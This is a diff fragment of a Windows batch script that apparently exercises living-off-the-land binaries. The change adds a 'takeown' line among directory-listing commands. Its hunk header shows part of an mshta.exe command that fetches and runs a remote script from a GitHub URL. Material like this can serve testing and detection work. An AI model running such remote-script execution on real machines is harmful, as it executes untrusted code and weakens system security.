@@ -212,6 +212,8 @@ mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBA
 ECHO ============================
 dir /s
 ECHO ============================
+takeown /F test.bat
+ECHO ============================
 dir /ah
 ECHO ============================
 dir "C:\Program Files" > C:\lists.txt
